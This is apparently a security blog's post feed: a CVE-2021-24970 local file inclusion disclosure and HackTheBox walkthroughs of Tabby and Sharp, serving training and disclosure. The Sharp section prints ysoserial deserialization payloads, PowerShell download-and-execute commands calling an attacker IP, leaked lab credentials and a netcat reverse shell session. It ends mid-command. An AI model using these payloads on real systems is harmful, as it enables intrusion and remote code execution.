[ { "title": "How i found my first 0day", "url": "/posts/How-i-found-my-first-0day/", "categories": "Publications", "tags": "Publications, SecurityResearching", "date": "2021-11-26 12:56:00 +0000", "snippet": "Title : All-in-One Video Gallery plugin &amp;lt;= 2.4.9 - Local File Inclusion (LFI) vulnerabilityAuthor: m19o Software : Wordpress 5.8.2CVE : CVE-2021-24970Poc : https://example/wordpress/wp-admin/admin.php?page=all-in-one-video-gallery&amp;amp;tab=../../../../../pocStatic analysisAt the beganinng i started to analyze the code to understand how the code workswhile analyzing the dashboard.php file i saw that the developer using require_once at the end of the file, as you can see {$active_tab} gets his value from TAB and TAB value is provided by the userLet&#39;s EXPLOITExploitationI wrote a php code to echo &quot;Proof Of Concept&quot; and i saved it at wordpress root directoryYou can execute any file with php extension because .php is added to any value you provideTest caseNow i will use the LFI to get reverse Shell**Here we go, I received the connection using Netcat as a listener**" }, { "title": "Hackthebox Tabby walkthrough", "url": "/posts/Hackthebox-Tabby-walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 02:07:00 +0000", "snippet": "EnumerationŸêNmap TIME!. ŸêŸêŸêAs you can see 80,22,8080 are open.Let`s start checking ŸêAfter some recon i didn`t found anything in 8080.ŸêBut i searched for megahosting exploit i found LFI so let`s try it. ŸêBANG ! , we got credentials. After some search i found out that we can have a reverse shell by uploading it to manager page Exploitation ŸêAfte uploading our shell let`s execute it. After some recon i found a backup file at /var/www/htmlSo i made an http server to download it to my machine and crack it Let`s crack it with FCRACKZIP Privilege Escalation I didn`t find anything interesting in the file , In the recon phase i found ash user so i tried the password on it BAM ! , we logged in and got user hashI found this article about LXD privilege escalation and knowing that the user is in LXD group lxd privilege escalation Let`s build ! Thanks for Reading üôè" }, { "title": "Hackthebox Sharp walkthrough", "url": "/posts/HackTheBox-Sharp-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:50:00 +0000", "snippet": "Methodology1- Scanning2- SMB Enumertion3- Kanban Analysis4- Config Manipulation5- Exploit Remote Service6- WCF ExploitationScanning‚îå‚îÄ‚îÄ(m19o@pwning)-[~/m19o/HTB/sharp]‚îî‚îÄ# nmap -sV -v -p- --min-rate=10000 10.10.10.219PORT STATE SERVICE VERSION135/tcp open tcpwrapped139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)8888/tcp open sun-answerbook?8889/tcp open ddi-tcp-2?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsSMB EnumerationWhen you see SMB in Windows enviroment you should go for it !Let&#39;s start enumeratingSMB Enumeration‚îå‚îÄ‚îÄ(m19o@pwning)-[~/m19o/HTB/sharp]‚îî‚îÄ# smbmap -H 10.10.10.219[+] IP: 10.10.10.219:445 Name: localhost Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev NO ACCESS IPC$ NO ACCESS Remote IPC kanban READ ONLYIt looks like that we can read Kanban directory only, so let&#39;s see what we can get‚îå‚îÄ‚îÄ(m19o@pwning)-[~/m19o/HTB/sharp]‚îî‚îÄ# smbmap -H 10.10.10.219 -R[+] IP: 10.10.10.219:445 Name: localhost Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev NO ACCESS IPC$ NO ACCESS Remote IPC kanban READ ONLY .\\kanban\\* dr--r--r-- 0 Sat Nov 14 13:57:04 2020 . dr--r--r-- 0 Sat Nov 14 13:57:04 2020 .. fr--r--r-- 58368 Sat Nov 14 13:57:04 2020 CommandLine.dll fr--r--r-- 141312 Sat Nov 14 13:57:04 2020 CsvHelper.dll fr--r--r-- 456704 Sat Nov 14 13:57:04 2020 DotNetZip.dll dr--r--r-- 0 Sat Nov 14 13:57:59 2020 Files fr--r--r-- 23040 Sat Nov 14 13:57:04 2020 Itenso.Rtf.Converter.Html.dll fr--r--r-- 75776 Sat Nov 14 13:57:04 2020 Itenso.Rtf.Interpreter.dll fr--r--r-- 32768 Sat Nov 14 13:57:04 2020 Itenso.Rtf.Parser.dll fr--r--r-- 19968 Sat Nov 14 13:57:04 2020 Itenso.Sys.dll fr--r--r-- 376832 Sat Nov 14 13:57:04 2020 MsgReader.dll fr--r--r-- 133296 Sat Nov 14 13:57:04 2020 Ookii.Dialogs.dll fr--r--r-- 2558011 Sat Nov 14 13:57:04 2020 pkb.zip dr--r--r-- 0 Sat Nov 14 13:57:04 2020 Plugins fr--r--r-- 5819 Sat Nov 14 13:57:04 2020 PortableKanban.cfg fr--r--r-- 118184 Sat Nov 14 13:57:04 2020 PortableKanban.Data.dll fr--r--r-- 1878440 Sat Nov 14 13:57:04 2020 PortableKanban.exe fr--r--r-- 31144 Sat Nov 14 13:57:04 2020 PortableKanban.Extensions.dll fr--r--r-- 2080 Sat Nov 14 13:57:04 2020 PortableKanban.pk3 fr--r--r-- 2080 Sat Nov 14 13:57:04 2020 PortableKanban.pk3.bak fr--r--r-- 34 Sat Nov 14 13:57:04 2020 PortableKanban.pk3.md5 fr--r--r-- 413184 Sat Nov 14 13:57:04 2020 ServiceStack.Common.dll fr--r--r-- 137216 Sat Nov 14 13:57:04 2020 ServiceStack.Interfaces.dll fr--r--r-- 292352 Sat Nov 14 13:57:04 2020 ServiceStack.Redis.dll fr--r--r-- 411648 Sat Nov 14 13:57:04 2020 ServiceStack.Text.dll fr--r--r-- 1050092 Sat Nov 14 13:57:04 2020 User Guide.pdf .\\kanban\\Plugins\\* dr--r--r-- 0 Sat Nov 14 13:57:04 2020 . dr--r--r-- 0 Sat Nov 14 13:57:04 2020 ..We need now to get the files on our machine to analyze it to see if we can get any useful informationsmbget -R smb://10.10.10.219/kanbanKanban AnalysisAfter downloading all the files in Kanban directory, I used ack to search for passwords in the filesapt-get install ack‚îå‚îÄ‚îÄ(m19o@pwning)-[~/m19o/HTB/sharp]‚îî‚îÄ# ack -i &quot;password&quot;PortableKanban.pk31:{&quot;Columns&quot;:[{&quot;Id&quot;:&quot;4757781032fd41b2a4511822e2c08850&quot;,&quot;SortOrder&quot;:0,&quot;Name&quot;:&quot;Demo&quot;,&quot;Limit&quot;:0,&quot;TaskOrder&quot;:{&quot;SortType&quot;:&quot;None&quot;,&quot;Parameters&quot;:[{&quot;Field&quot;:&quot;Completed&quot;,&quot;SortOrder&quot;:&quot;Descending&quot;},{&quot;Field&quot;:&quot;Deadline&quot;,&quot;SortOrder&quot;:&quot;Ascending&quot;},{&quot;Field&quot;:&quot;Priority&quot;,&quot;SortOrder&quot;:&quot;Descending&quot;},{&quot;Field&quot;:&quot;Topic&quot;,&quot;SortOrder&quot;:&quot;Ascending&quot;},{&quot;Field&quot;:&quot;Person&quot;,&quot;SortOrder&quot;:&quot;Ascending&quot;}]},&quot;AutoComplete&quot;:false,&quot;ResetCompleted&quot;:false,&quot;TimeStamp&quot;:637409769443121006}],&quot;Tasks&quot;:[{&quot;Id&quot;:&quot;33870d6dfe4146718ba0b2c9f7bc05cf&quot;,&quot;SeriesId&quot;:&quot;00000000000000000000000000000000&quot;,&quot;SortOrder&quot;:&quot;oGdBKcFw&quot;,&quot;ColumnId&quot;:&quot;4757781032fd41b2a4511822e2c08850&quot;,&quot;TopicId&quot;:&quot;00000000000000000000000000000000&quot;,&quot;PersonId&quot;:&quot;00000000000000000000000000000000&quot;,&quot;Text&quot;:&quot;New Task&quot;,&quot;Priority&quot;:&quot;Low&quot;,&quot;Created&quot;:&quot;\\/Date(1605380100000+0100)\\/&quot;,&quot;CreatedBy&quot;:&quot;e8e29158d70d44b1a1ba4949d52790a0&quot;,&quot;Modified&quot;:&quot;\\/Date(-62135596800000)\\/&quot;,&quot;ModifiedBy&quot;:&quot;00000000000000000000000000000000&quot;,&quot;Deadline&quot;:&quot;\\/Date(1605308400000+0100)\\/&quot;,&quot;HasDeadline&quot;:false,&quot;Completed&quot;:&quot;\\/Date(1605308400000+0100)\\/&quot;,&quot;CompletedBy&quot;:&quot;00000000000000000000000000000000&quot;,&quot;Done&quot;:false,&quot;Canceled&quot;:false,&quot;Link&quot;:&quot;&quot;,&quot;Subtasks&quot;:[],&quot;Tags&quot;:[],&quot;Estimate&quot;:0,&quot;Progress&quot;:0,&quot;Points&quot;:0,&quot;Comments&quot;:[],&quot;CustomFields&quot;:{},&quot;TimeStamp&quot;:637409769542424146}],&quot;TimeTracks&quot;:[],&quot;Persons&quot;:[],&quot;Topics&quot;:[],&quot;Tags&quot;:[],&quot;Views&quot;:[],&quot;Users&quot;:[{&quot;Id&quot;:&quot;e8e29158d70d44b1a1ba4949d52790a0&quot;,&quot;Name&quot;:&quot;Administrator&quot;,&quot;Initials&quot;:&quot;&quot;,&quot;Email&quot;:&quot;&quot;,&quot;EncryptedPassword&quot;:&quot;k+iUoOvQYG98PuhhRC7/rg==&quot;,&quot;Role&quot;:&quot;Admin&quot;,&quot;Inactive&quot;:false,&quot;TimeStamp&quot;:637409769245503731},{&quot;Id&quot;:&quot;0628ae1de5234b81ae65c246dd2b4a21&quot;,&quot;Name&quot;:&quot;lars&quot;,&quot;Initials&quot;:&quot;&quot;,&quot;Email&quot;:&quot;&quot;,&quot;EncryptedPassword&quot;:&quot;Ua3LyPFM175GN8D3+tqwLA==&quot;,&quot;Role&quot;:&quot;User&quot;,&quot;Inactive&quot;:false,&quot;TimeStamp&quot;:637409769265925613}],&quot;ServiceMessages&quot;:[],&quot;CustomFieldDescriptors&quot;:[],&quot;MetaData&quot;:{&quot;Id&quot;:&quot;ffffffffffffffffffffffffffffffff&quot;,&quot;SchemaVersion&quot;:&quot;4.2.0.0&quot;,&quot;SchemaVersionModified&quot;:&quot;\\/Date(1605380100000+0100)\\/&quot;,&quot;SchemaVersionModifiedBy&quot;:&quot;e8e29158d70d44b1a1ba4949d52790a0&quot;,&quot;SchemaVersionChecked&quot;:&quot;\\/Date(-62135596800000-0000)\\/&quot;,&quot;SchemaVersionCheckedBy&quot;:&quot;00000000000000000000000000000000&quot;,&quot;TimeStamp&quot;:637409769001918463}}Ack found creds in PortableKanban.pk3AdministratorID: e8e29158d70d44b1a1ba4949d52790a0Encrypted Password: &quot;k+iUoOvQYG98PuhhRC7/rg==&quot;LarsID: 0628ae1de5234b81ae65c246dd2b4a21Encrypted Password: &quot;Ua3LyPFM175GN8D3+tqwLA==&quot;I needed to read Kanban user guide to know how the porgram worksPage 1: The program is portable so we can edit the config but it will be our responsibility if something happenedPage 3: Password can be blank but you shouldn&#39;t use it like that Page 11: Administrator is the default account and the password is blank Page 18: If your forgot the password take executable file to another directorty and run it as admin Page 22: Passwords in setup/users tabAfter reading the guide, now to need to run the exe file on another directory to restore the passwords From now you should use windows VM, In my case iam using dual boot so i countinued with windowsWhen i ran it as admin it says that the files has been successfully recoverdSo i tried to sign in as administrator since it&#39;s the default user and that&#39;s the only user we knowConfig ManipulationI can&#39;t log in, So since it&#39;s a portable software let&#39;s take a look at the configurationIt&#39;s looks like when the application load it takes an encrypted password for the administratorAs i mentioned earlier we can use a blank password, So now let&#39;s remove the password and try to log inBAM ! we logged inNow let&#39;s go to Setup/users tab to get the passwordsYou need to uncheck the hide password box to get itSo we got Lars:G123HHrth234gRG‚îå‚îÄ‚îÄ(m19o@pwning)-[~/m19o/HTB/sharp]‚îî‚îÄ# smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219[+] IP: 10.10.10.219:445 Name: localhost Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev READ ONLY IPC$ READ ONLY Remote IPC kanban NO ACCESSAs you see we have permissions on another 2 directories, Let&#39;s list all the files‚îå‚îÄ‚îÄ(m19o@pwning)-[~/m19o/HTB/sharp]‚îî‚îÄ# smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 -R[+] IP: 10.10.10.219:445 Name: localhost Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev READ ONLY .\\dev\\* dr--r--r-- 0 Sun Nov 15 06:30:13 2020 . dr--r--r-- 0 Sun Nov 15 06:30:13 2020 .. fr--r--r-- 5632 Sun Nov 15 05:25:01 2020 Client.exe fr--r--r-- 70 Sun Nov 15 08:59:02 2020 notes.txt fr--r--r-- 4096 Sun Nov 15 05:25:01 2020 RemotingLibrary.dll fr--r--r-- 6144 Mon Nov 16 06:55:44 2020 Server.exe IPC$ READ ONLY Remote IPC .\\IPC$\\* fr--r--r-- 3 Sun Dec 31 19:03:58 1600 InitShutdown fr--r--r-- 4 Sun Dec 31 19:03:58 1600 lsass fr--r--r-- 3 Sun Dec 31 19:03:58 1600 ntsvcs fr--r--r-- 3 Sun Dec 31 19:03:58 1600 scerpc fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-364-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 epmapper fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-1e4-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 LSM_API_service fr--r--r-- 3 Sun Dec 31 19:03:58 1600 eventlog fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-190-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 atsvc fr--r--r-- 4 Sun Dec 31 19:03:58 1600 wkssvc fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-428-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 W32TIME_ALT fr--r--r-- 4 Sun Dec 31 19:03:58 1600 srvsvc fr--r--r-- 1 Sun Dec 31 19:03:58 1600 vgauth-service fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-254-0 fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-274-0 fr--r--r-- 1 Sun Dec 31 19:03:58 1600 PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 19:03:58 1600 PSHost.132546763363573536.2940.DefaultAppDomain.wsmprovhost kanban NO ACCESSThat&#39;s a lot of files, let&#39;s get download them on our machinesmbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRGExploit Remote ServiceWe have now to exe files so we need to De-Compile them and analyze themI used Dnspy https://github.com/dnSpy/dnSpySo i opened Client.exeYou can see RemoteSample right ?, Let&#39;s see what it contains.It&#39;s connecting to port 8888 and there&#39;s creds as you can seeUserI searched for .NET remote service exploit and found : ExploitRemotingServiceCreating the reverse shell on Windows1- Download python for windows to start HTTP server to host the reverse shell file2- Download compiled Nc.exe to get the reverse shell connection3- Use nishang reverse shell and add this line [Invoke-PowerShellTcp -Reverse -IPAddress [Your IP] -Port [Your listner port]] at the end of the file to download our hosted reverse shell file4- Download Ysoserial to serialize our payload to bypass windows defenderysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c &quot;powershell -c IEX(new-object net.webclient).downloadstring(&#39;http://10.10.x.x/Invoke-PowerShellTcp.ps1&#39;)&quot;After serializingAAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoLNow we need to use the exploit we found and use the seralized payloadExploitRemotingService.exe -s --user=debug --pass=&quot;SharpApplicationDebugUserPassword123!&quot; tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoLIt will gives you an error ignore it and check your netcatD:\\SEALED\\Sharp&amp;gt;nc.exe -lvp 9001listening on [any] 4321 ...Windows PowerShell running as user lars on SHARPCopyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\\Windows\\system32&amp;gt;whoamisharp\\larsPS C:\\Windows\\system32&amp;gt; net userUser accounts for \\\\SHARP-------------------------------------------------------------------------------Administrator debug DefaultAccountGuest lars WDAGUtilityAccountThe command completed successfully.1st flag is collectedPS C:\\users\\lars\\desktop&amp;gt; dir Directory: C:\\users\\lars\\desktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 1/7/2021 2:17 PM 34 user.txtPS C:\\users\\lars\\desktop&amp;gt; type user.txtq5e84wq8e4qw8f4dw8f4sdfAfter enumerating and that took a lot of time i found dir called WCF and that&#39;s a windows servicePS C:\\users\\lars\\documents\\wcf&amp;gt; dir Directory: C:\\users\\lars\\documents\\wcfMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/15/2020 1:40 PM .vs d----- 11/15/2020 1:40 PM Client d----- 11/15/2020 1:40 PM packages d----- 11/15/2020 1:40 PM RemotingLibrary d----- 11/15/2020 1:41 PM Server -a---- 11/15/2020 12:47 PM 2095 wcf.slnI compressed it and moved it to dev dir so i can mount it to get the filePS C:\\users\\lars\\documents&amp;gt; dir Directory: C:\\users\\lars\\documentsMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/15/2020 1:40 PM wcf PS C:\\users\\lars\\documents&amp;gt; Compress-Archive -LiteralPath C:\\users\\lars\\Documents\\wcf -DestinationPath C:\\users\\lars\\Documents\\wcf.zipPS C:\\users\\lars\\documents&amp;gt; dir Directory: C:\\users\\lars\\documentsMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/15/2020 1:40 PM wcf -a---- 1/9/2021 6:09 PM 11598452 wcf.zipMoving the compressed filemove-item -path C:\\users\\lars\\Documents\\wcf.zip -destination c:\\devMounting dev dirC:\\Users\\Administrator&amp;gt;net use X: \\\\10.10.10.219\\devExploiting WCFThere is an exe file so let&#39;s De-compile it with Dnspy like we did beforeLet&#39;s check what the main function containsIt&#39;s connecting to port 8889, WCF is a windows service so it should be running as a privileged userNow we need to edit the code to get our reverse shellConsole.WriteLine(wcfService.InvokePowerShell(&quot;iex (new-object 